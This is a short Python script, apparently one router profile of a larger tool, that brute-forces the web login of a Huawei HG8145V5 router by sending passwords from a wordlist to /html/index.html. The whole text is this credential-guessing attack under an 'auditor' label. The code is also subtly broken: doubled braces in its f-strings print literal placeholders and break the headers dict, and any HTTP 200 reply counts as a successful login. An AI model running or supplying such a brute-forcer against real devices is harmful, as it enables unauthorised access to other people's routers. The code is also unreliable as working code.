# Router Model Stub: Huawei HG8145V5
# Endpoint: /html/index.html | Form Keys: and/or token auth

def run_audit(target_ip, username, wordlist_path):
    import urllib.request
    import urllib.parse
    import os

    print(f"\n[+] Running Huawei HG8145V5 Auditor against {{target_ip}}...")
    target_url = f"http://{{target_ip}}/html/index.html"
    
    if not os.path.exists(wordlist_path):
        print(f"[!] Wordlist file '{{wordlist_path}}' not found.")
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[*] Loaded {{len(passwords)}} passwords for Huawei profile.")

    for idx, pwd in enumerate(passwords, 1):
        print(f"[Attempt {{idx}}] Testing password: {{pwd}}")
        try:
            form_data = urllib.parse.urlencode({'UserName': username, 'PassWord': pwd}).encode('utf-8')
            req = urllib.request.Request(target_url, data=form_data, headers={{'User-Agent': 'Mozilla/5.0'}})
            with urllib.request.urlopen(req, timeout=3) as response:
                if response.status == 200:
                    print(f"\n[✔] SUCCESS! Huawei Match -> Username: {{username}} | Password: {{pwd}}\n")
                    return
        except Exception:
            pass

    print("\n[-] Huawei audit finished.")
